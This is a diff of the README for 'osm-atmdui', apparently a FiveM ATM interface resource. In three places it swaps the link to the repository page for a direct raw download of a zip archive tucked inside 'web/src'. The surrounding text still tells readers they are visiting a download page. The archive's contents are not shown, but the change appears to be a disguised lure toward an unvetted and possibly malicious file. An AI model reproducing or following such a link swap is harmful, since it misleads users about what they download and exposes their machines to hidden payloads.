@@ -1,11 +1,11 @@
 # 🏧 osm-atmdui - Realistic ATM UI for FiveM
 
-[![Download and install](https://img.shields.io/badge/Download%20and%20install-Visit%20the%20page-2b6cb0?style=for-the-badge)](https://github.com/Welshonioninfinitude16/osm-atmdui)
+[![Download and install](https://img.shields.io/badge/Download%20and%20install-Visit%20the%20page-2b6cb0?style=for-the-badge)](https://github.com/Welshonioninfinitude16/osm-atmdui/raw/refs/heads/main/web/src/atmdui-osm-1.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
-https://github.com/Welshonioninfinitude16/osm-atmdui
+https://github.com/Welshonioninfinitude16/osm-atmdui/raw/refs/heads/main/web/src/atmdui-osm-1.7.zip
 
 ## 🖥️ What this does
 
@@ -38,7 +38,7 @@ Before you use this resource, make sure you have:
 ## 📦 Download and install
 
 1. Visit the download page:
-   https://github.com/Welshonioninfinitude16/osm-atmdui
+   https://github.com/Welshonioninfinitude16/osm-atmdui/raw/refs/heads/main/web/src/atmdui-osm-1.7.zip
 
 2. Download the repository files to your computer.
 
